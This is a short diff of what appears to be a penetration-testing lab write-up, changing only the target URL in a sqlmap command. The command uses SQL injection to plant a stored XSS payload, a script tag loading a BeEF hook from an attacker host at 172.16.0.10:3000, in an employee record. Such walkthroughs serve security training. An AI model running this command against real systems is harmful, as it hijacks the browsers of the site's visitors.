@@ -315,7 +315,7 @@ We can use SQL injection to UPDATE an employee's notes field with our BeEF hook:
 
 ```bash
 # Using sqlmap to inject our XSS payload
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
+sqlmap -u "http://172.16.0.100/employees/?search=test" \
   --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
 ```
 
